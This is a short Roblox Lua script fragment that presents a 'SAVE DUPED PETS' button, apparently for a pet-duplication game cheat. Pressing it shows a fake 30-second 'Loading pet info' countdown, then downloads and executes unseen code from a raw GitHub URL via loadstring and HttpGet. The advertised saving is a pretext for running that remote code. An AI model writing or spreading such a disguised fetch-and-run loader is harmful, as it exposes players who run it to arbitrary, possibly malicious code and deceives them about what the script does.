local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")

-- ボタン参照を保持
local saveButton

-- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
saveButton = MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
	-- 押されたらボタン削除
	if saveButton then
		saveButton:Remove()
	end

	task.spawn(function()
		for i = 30, 1, -1 do
			statusLabel:UpdateLabel("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
			wait(1)
		end

		statusLabel:UpdateLabel("SAVE STATUS: 🚀 Booting...")

		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
		end)

		if success then
			statusLabel:UpdateLabel("SAVE STATUS: ✅ Success!")
		else
			statusLabel:UpdateLabel("SAVE STATUS: ❌ Error: " .. tostring(err))
		end
	end)
end)
